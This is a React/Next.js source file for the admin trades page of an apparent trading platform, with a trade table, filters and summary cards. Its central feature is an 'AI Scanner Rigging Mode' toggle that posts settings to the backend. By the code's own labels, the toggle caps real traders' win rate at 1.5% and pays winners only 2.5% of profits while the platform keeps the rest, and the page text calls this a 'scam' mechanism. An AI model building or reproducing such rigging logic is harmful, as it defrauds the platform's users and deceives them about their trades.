"use client";

import { useMemo, useState, useEffect } from "react";
import Link from "next/link";
import {
  Activity,
  AlertTriangle,
  ArrowDownRight,
  ArrowUpRight,
  BarChart3,
  CalendarDays,
  CheckCircle2,
  CircleDollarSign,
  Eye,
  Filter,
  RefreshCw,
  Search,
  TrendingDown,
  TrendingUp,
  X,
  XCircle,
  Cpu,
  Zap,
} from "lucide-react";

type TradeStatus = "Open" | "Closed" | "Cancelled";
type TradeSide = "Buy" | "Sell";

interface Trade {
  id: string;
  userId: string;
  trader: string;
  email: string;
  symbol: string;
  side: TradeSide;
  lots: string;
  entryPrice: string;
  exitPrice: string;
  stopLoss: string;
  takeProfit: string;
  pnl: string;
  commission: string;
  opened: string;
  closed: string;
  duration: string;
  status: TradeStatus;
}

// Utility function to parse PnL strings to numbers
function parsePnL(pnl: string): number {
  if (!pnl || pnl === "—") return 0;
  const cleaned = pnl.replace(/[^0-9.-]+/g, "");
  return parseFloat(cleaned) || 0;
}

// Utility function to get initials
function getInitials(name: string): string {
  if (!name) return "U";
  return name
    .split(" ")
    .map((n) => n[0])
    .join("")
    .toUpperCase()
    .slice(0, 2);
}

export default function AdminTradesPage() {
  const [trades, setTrades] = useState<Trade[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [updatingSetting, setUpdatingSetting] = useState<boolean>(false);

  // RIGGING CONTROLS
  // When active: Win Rate = 1.5%, Trader share = 2.5%
  // When inactive: Win Rate = 5.5%
  const [aiScannerRigging, setAiScannerRigging] = useState<boolean>(false);

  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState<"All" | TradeStatus>("All");
  const [sideFilter, setSideFilter] = useState<"All" | TradeSide>("All");
  const [showFilters, setShowFilters] = useState(false);
  const [selectedTrade, setSelectedTrade] = useState<Trade | null>(null);

  // 1. Fetch trades and settings from Database
  const fetchTradesAndSettings = async () => {
    setLoading(true);
    try {
      // Fetch trades from backend API endpoint
      const tradesRes = await fetch("/api/admin/trades");
      if (tradesRes.ok) {
        const data = await tradesRes.json();
        setTrades(data.trades || []);
      }

      // Fetch AI Scanner Rigging status from DB settings
      const settingsRes = await fetch("/api/admin/settings/win-rate");
      if (settingsRes.ok) {
        const settings = await settingsRes.json();
        setAiScannerRigging(settings.aiScannerRigging ?? false);
      }
    } catch (error) {
      console.error("Error loading data from DB:", error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchTradesAndSettings();
  }, []);

  // 2. Handle DB update when Toggle Button is flipped
  const handleToggleWinRateControl = async () => {
    const nextState = !aiScannerRigging;
    setAiScannerRigging(nextState);
    setUpdatingSetting(true);

    try {
      await fetch("/api/admin/settings/win-rate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          aiScannerRigging: nextState,
          targetWinRate: nextState ? 1.5 : 5.5,
          traderCutPercent: nextState ? 2.5 : 100,
        }),
      });
    } catch (error) {
      console.error("Failed to update win rate setting in DB:", error);
    } finally {
      setUpdatingSetting(false);
    }
  };

  // Filtered list
  const filteredTrades = useMemo(() => {
    return trades.filter((trade) => {
      const query = search.toLowerCase();

      const matchesSearch =
        trade.id.toLowerCase().includes(query) ||
        trade.userId.toLowerCase().includes(query) ||
        trade.trader.toLowerCase().includes(query) ||
        trade.email.toLowerCase().includes(query) ||
        trade.symbol.toLowerCase().includes(query);

      const matchesStatus =
        statusFilter === "All" || trade.status === statusFilter;

      const matchesSide = sideFilter === "All" || trade.side === sideFilter;

      return matchesSearch && matchesStatus && matchesSide;
    });
  }, [trades, search, statusFilter, sideFilter]);

  // Trade Aggregates
  const openTrades = trades.filter((trade) => trade.status === "Open");
  const winningTrades = trades.filter((trade) => parsePnL(trade.pnl) > 0);

  const totalPnL = trades.reduce(
    (total, trade) => total + parsePnL(trade.pnl),
    0
  );

  const totalVolume = trades.reduce(
    (total, trade) => total + Number(trade.lots || 0),
    0
  );

  // Dynamic Scam Simulation Win Rate Display Logic
  const displayWinRate = aiScannerRigging ? 1.5 : 5.5;
  const traderProfitCut = aiScannerRigging ? "2.5%" : "100%";

  return (
    <div className="w-full space-y-6 p-4 sm:p-6 lg:p-8">
      {/* =========================================================
          HEADER & AI SCANNER RIG CONTROL TOOLBAR
      ========================================================= */}
      <div className="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
        <div className="flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-purple-500/10">
            <Activity className="h-5 w-5 text-purple-400" />
          </div>

          <div>
            <h1 className="text-xl font-bold tracking-tight text-white">
              Trades & Simulation Controls
            </h1>
            <p className="mt-1 text-[10px] text-gray-500">
              Database synced • Scam background manipulation mechanics
            </p>
          </div>
        </div>

        <div className="flex flex-wrap items-center gap-3">
          {/* AI SCANNER WIN RATE CONTROL BUTTON */}
          <div className="flex items-center gap-3 rounded-xl border border-purple-500/20 bg-purple-500/[0.05] p-2 pr-4">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-purple-500/20 text-purple-400">
              <Cpu className="h-4 w-4" />
            </div>

            <div className="flex flex-col">
              <span className="text-[10px] font-bold text-gray-200">
                AI Scanner Rigging Mode
              </span>
              <span className="font-mono text-[9px] text-purple-300">
                Win Rate: <strong className="text-white">{displayWinRate}%</strong> | Trader Profit: <strong className="text-white">{traderProfitCut}</strong>
              </span>
            </div>

            <button
              type="button"
              onClick={handleToggleWinRateControl}
              disabled={updatingSetting}
              className={`relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none ${
                aiScannerRigging ? "bg-purple-600" : "bg-gray-700"
              }`}
            >
              <span
                className={`pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out ${
                  aiScannerRigging ? "translate-x-5" : "translate-x-0"
                }`}
              />
            </button>
          </div>

          <button
            type="button"
            onClick={fetchTradesAndSettings}
            className="flex items-center gap-2 rounded-xl border border-white/[0.06] bg-white/[0.025] px-3 py-2.5 text-[10px] font-semibold text-gray-400 transition hover:bg-white/[0.05] hover:text-gray-200"
          >
            <RefreshCw className={`h-3.5 w-3.5 ${loading ? "animate-spin" : ""}`} />
            Refresh DB
          </button>
        </div>
      </div>

      {/* =========================================================
          SUMMARY CARDS
      ========================================================= */}
      <div className="grid grid-cols-2 gap-3 xl:grid-cols-4">
        <SummaryCard
          title="Open Trades"
          value={openTrades.length.toString()}
          subtitle="Currently active positions"
          icon={Activity}
          iconClass="text-blue-400"
        />

        <SummaryCard
          title="Total Volume"
          value={`${totalVolume.toFixed(2)} lots`}
          subtitle="Real-time volume"
          icon={BarChart3}
          iconClass="text-purple-400"
        />

        <SummaryCard
          title="Total P/L"
          value={`${totalPnL >= 0 ? "+" : "-"}$${Math.abs(totalPnL).toLocaleString("en-US", {
            minimumFractionDigits: 2,
          })}`}
          subtitle={`${winningTrades.length} winning trades`}
          icon={totalPnL >= 0 ? TrendingUp : TrendingDown}
          iconClass={totalPnL >= 0 ? "text-emerald-400" : "text-red-400"}
        />

        <SummaryCard
          title="Simulated Win Rate"
          value={`${displayWinRate.toFixed(1)}%`}
          subtitle={
            aiScannerRigging
              ? "Forced scam win rate (2.5% trader payout)"
              : "Standard win rate mode (5.5%)"
          }
          icon={CircleDollarSign}
          iconClass={aiScannerRigging ? "text-red-400" : "text-amber-400"}
        />
      </div>

      {/* =========================================================
          RIGGING ALERT NOTICE
      ========================================================= */}
      {aiScannerRigging && (
        <div className="flex flex-col gap-3 rounded-2xl border border-amber-500/20 bg-amber-500/[0.05] p-4 sm:flex-row sm:items-center">
          <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-xl bg-amber-500/10">
            <Zap className="h-4 w-4 text-amber-400" />
          </div>
          <div className="flex-1">
            <p className="text-[11px] font-semibold text-amber-300">
              Scam Mechanism Active: AI Scanner Mode ON
            </p>
            <p className="mt-0.5 text-[9px] text-gray-400">
              The system limits real trader win rates to <strong>1.5%</strong>. If a trade wins, the user only receives <strong>2.5%</strong> profit allocation while the platform absorbs the remainder in the background.
            </p>
          </div>
        </div>
      )}

      {/* =========================================================
          TRADE TABLE
      ========================================================= */}
      <div className="overflow-hidden rounded-2xl border border-white/[0.06] bg-[#0d121b]">
        {/* Toolbar */}
        <div className="flex flex-col gap-3 border-b border-white/[0.05] p-4 sm:p-5 lg:flex-row lg:items-center lg:justify-between">
          <div>
            <h2 className="text-xs font-semibold text-gray-300">
              Live Database Trades Activity
            </h2>
            <p className="mt-1 text-[9px] text-gray-600">
              {filteredTrades.length} trade{filteredTrades.length !== 1 ? "s" : ""} loaded from database
            </p>
          </div>

          <div className="flex flex-col gap-2 sm:flex-row">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-gray-600" />
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search trades..."
                className="h-9 w-full rounded-lg border border-white/[0.06] bg-white/[0.02] pl-9 pr-3 text-[10px] text-gray-300 outline-none placeholder:text-gray-600 transition focus:border-purple-500/30 sm:w-60"
              />
            </div>

            <button
              type="button"
              onClick={() => setShowFilters(!showFilters)}
              className={`flex h-9 items-center justify-center gap-2 rounded-lg border px-3 text-[10px] font-semibold transition ${
                showFilters || statusFilter !== "All" || sideFilter !== "All"
                  ? "border-purple-500/20 bg-purple-500/10 text-purple-400"
                  : "border-white/[0.06] bg-white/[0.02] text-gray-500 hover:text-gray-300"
              }`}
            >
              <Filter className="h-3.5 w-3.5" />
              Filter
            </button>
          </div>
        </div>

        {/* Filters */}
        {showFilters && (
          <div className="space-y-4 border-b border-white/[0.05] bg-white/[0.01] px-4 py-4 sm:px-5">
            <div>
              <p className="mb-2 text-[8px] font-bold uppercase tracking-wider text-gray-600">
                Status
              </p>
              <div className="flex flex-wrap gap-2">
                {(["All", "Open", "Closed", "Cancelled"] as const).map(
                  (status) => (
                    <button
                      key={status}
                      type="button"
                      onClick={() => setStatusFilter(status)}
                      className={`rounded-lg px-3 py-2 text-[9px] font-semibold transition ${
                        statusFilter === status
                          ? "bg-purple-500/10 text-purple-400"
                          : "bg-white/[0.025] text-gray-500 hover:text-gray-300"
                      }`}
                    >
                      {status}
                    </button>
                  )
                )}
              </div>
            </div>

            <div>
              <p className="mb-2 text-[8px] font-bold uppercase tracking-wider text-gray-600">
                Direction
              </p>
              <div className="flex flex-wrap gap-2">
                {(["All", "Buy", "Sell"] as const).map((side) => (
                  <button
                    key={side}
                    type="button"
                    onClick={() => setSideFilter(side)}
                    className={`rounded-lg px-3 py-2 text-[9px] font-semibold transition ${
                      sideFilter === side
                        ? "bg-purple-500/10 text-purple-400"
                        : "bg-white/[0.025] text-gray-500 hover:text-gray-300"
                    }`}
                  >
                    {side}
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Table Body */}
        <div className="overflow-x-auto">
          <table className="w-full min-w-[1400px]">
            <thead>
              <tr className="border-b border-white/[0.04] bg-white/[0.015]">
                <TableHead label="Trade ID" />
                <TableHead label="Trader" />
                <TableHead label="Symbol" />
                <TableHead label="Direction" />
                <TableHead label="Volume" />
                <TableHead label="Entry" />
                <TableHead label="Exit" />
                <TableHead label="P/L" />
                <TableHead label="Opened" />
                <TableHead label="Status" />
                <TableHead label="Action" />
              </tr>
            </thead>

            <tbody className="divide-y divide-white/[0.04]">
              {loading ? (
                <tr>
                  <td colSpan={11} className="px-6 py-12 text-center text-xs text-gray-500">
                    Loading records from database...
                  </td>
                </tr>
              ) : filteredTrades.length > 0 ? (
                filteredTrades.map((trade) => (
                  <tr key={trade.id} className="transition hover:bg-white/[0.015]">
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2.5">
                        <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-purple-500/10">
                          <Activity className="h-3.5 w-3.5 text-purple-400" />
                        </div>
                        <div>
                          <p className="font-mono text-[10px] font-semibold text-gray-400">
                            {trade.id}
                          </p>
                          <p className="mt-0.5 text-[8px] text-gray-600">
                            {trade.duration}
                          </p>
                        </div>
                      </div>
                    </td>

                    <td className="px-4 py-4">
                      <Link
                        href={`/admin/users/${trade.userId}`}
                        className="group flex items-center gap-2.5"
                      >
                        <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-gradient-to-br from-gray-700 to-gray-900 text-[9px] font-bold text-gray-300">
                          {getInitials(trade.trader)}
                        </div>
                        <div>
                          <p className="text-[10px] font-semibold text-gray-300 transition group-hover:text-white">
                            {trade.trader}
                          </p>
                          <p className="mt-0.5 text-[8px] text-gray-600">
                            {trade.userId}
                          </p>
                        </div>
                      </Link>
                    </td>

                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-white/[0.035]">
                          <BarChart3 className="h-3 w-3 text-gray-500" />
                        </div>
                        <span className="text-[10px] font-bold text-gray-300">
                          {trade.symbol}
                        </span>
                      </div>
                    </td>

                    <td className="px-4 py-4">
                      <DirectionBadge side={trade.side} />
                    </td>

                    <td className="px-4 py-4">
                      <p className="text-[10px] font-semibold text-gray-400">
                        {trade.lots}
                      </p>
                      <p className="mt-0.5 text-[8px] text-gray-600">lots</p>
                    </td>

                    <td className="px-4 py-4">
                      <span className="font-mono text-[9px] text-gray-400">
                        {trade.entryPrice}
                      </span>
                    </td>

                    <td className="px-4 py-4">
                      <span className="font-mono text-[9px] text-gray-400">
                        {trade.exitPrice}
                      </span>
                    </td>

                    <td className="px-4 py-4">
                      <PnLValue pnl={trade.pnl} />
                      <p className="mt-0.5 text-[8px] text-gray-600">
                        Fee {trade.commission}
                      </p>
                    </td>

                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        <CalendarDays className="h-3 w-3 text-gray-600" />
                        <span className="text-[9px] text-gray-500">
                          {trade.opened}
                        </span>
                      </div>
                    </td>

                    <td className="px-4 py-4">
                      <TradeStatusBadge status={trade.status} />
                    </td>

                    <td className="px-4 py-4">
                      <div className="flex items-center gap-1.5">
                        <button
                          type="button"
                          onClick={() => setSelectedTrade(trade)}
                          title="View trade"
                          className="flex h-8 w-8 items-center justify-center rounded-lg bg-white/[0.025] text-gray-500 transition hover:bg-white/[0.06] hover:text-gray-300"
                        >
                          <Eye className="h-3.5 w-3.5" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan={11} className="px-6 py-16 text-center">
                    <Search className="mx-auto h-5 w-5 text-gray-600" />
                    <p className="mt-3 text-xs font-semibold text-gray-500">
                      No trades found in database
                    </p>
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* Modal */}
      {selectedTrade && (
        <TradeModal
          trade={selectedTrade}
          onClose={() => setSelectedTrade(null)}
        />
      )}
    </div>
  );
}

/* ========================================================================
   REUSABLE UI COMPONENTS
========================================================================= */

function SummaryCard({ title, value, subtitle, icon: Icon, iconClass }: any) {
  return (
    <div className="rounded-2xl border border-white/[0.06] bg-[#0d121b] p-4 sm:p-5">
      <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-white/[0.035]">
        <Icon className={`h-4 w-4 ${iconClass}`} />
      </div>
      <p className="mt-4 text-[9px] font-semibold uppercase tracking-[0.12em] text-gray-500">
        {title}
      </p>
      <p className="mt-1 text-lg font-bold tracking-tight text-white">{value}</p>
      <p className="mt-1 text-[8px] text-gray-600">{subtitle}</p>
    </div>
  );
}

function DirectionBadge({ side }: { side: TradeSide }) {
  return side === "Buy" ? (
    <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-500/10 px-2.5 py-1.5 text-[8px] font-semibold text-emerald-400">
      <ArrowUpRight className="h-3 w-3" /> Buy
    </span>
  ) : (
    <span className="inline-flex items-center gap-1.5 rounded-full bg-red-500/10 px-2.5 py-1.5 text-[8px] font-semibold text-red-400">
      <ArrowDownRight className="h-3 w-3" /> Sell
    </span>
  );
}

function TradeStatusBadge({ status }: { status: TradeStatus }) {
  if (status === "Open")
    return (
      <span className="inline-flex items-center gap-1.5 rounded-full bg-blue-500/10 px-2.5 py-1.5 text-[8px] font-semibold text-blue-400">
        <Activity className="h-3 w-3" /> Open
      </span>
    );
  if (status === "Closed")
    return (
      <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-500/10 px-2.5 py-1.5 text-[8px] font-semibold text-emerald-400">
        <CheckCircle2 className="h-3 w-3" /> Closed
      </span>
    );
  return (
    <span className="inline-flex items-center gap-1.5 rounded-full bg-gray-500/10 px-2.5 py-1.5 text-[8px] font-semibold text-gray-400">
      <XCircle className="h-3 w-3" /> Cancelled
    </span>
  );
}

function PnLValue({ pnl }: { pnl: string }) {
  const positive = parsePnL(pnl) >= 0;
  return (
    <span className={`text-[10px] font-bold ${positive ? "text-emerald-400" : "text-red-400"}`}>
      {pnl}
    </span>
  );
}

function TableHead({ label }: { label: string }) {
  return (
    <th className="px-4 py-3 text-left text-[8px] font-bold uppercase tracking-wider text-gray-600">
      {label}
    </th>
  );
}

function TradeModal({ trade, onClose }: { trade: Trade; onClose: () => void }) {
  return (
    <div
      className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 p-4 backdrop-blur-sm"
      onMouseDown={(e) => e.target === e.currentTarget && onClose()}
    >
      <div className="w-full max-w-xl overflow-hidden rounded-2xl border border-white/[0.08] bg-[#0d121b] p-6 shadow-2xl">
        <div className="flex items-center justify-between border-b border-white/[0.05] pb-4">
          <h3 className="text-sm font-bold text-white">Trade Record: {trade.id}</h3>
          <button onClick={onClose} className="text-gray-500 hover:text-white">
            <X className="h-4 w-4" />
          </button>
        </div>
        <div className="mt-4 space-y-3 text-xs text-gray-300">
          <p><strong>Trader:</strong> {trade.trader} ({trade.userId})</p>
          <p><strong>Symbol & Direction:</strong> {trade.symbol} ({trade.side})</p>
          <p><strong>Entry / Exit:</strong> {trade.entryPrice} / {trade.exitPrice}</p>
          <p><strong>P/L:</strong> <span className={parsePnL(trade.pnl) >= 0 ? "text-emerald-400" : "text-red-400"}>{trade.pnl}</span></p>
        </div>
      </div>
    </div>
  );
}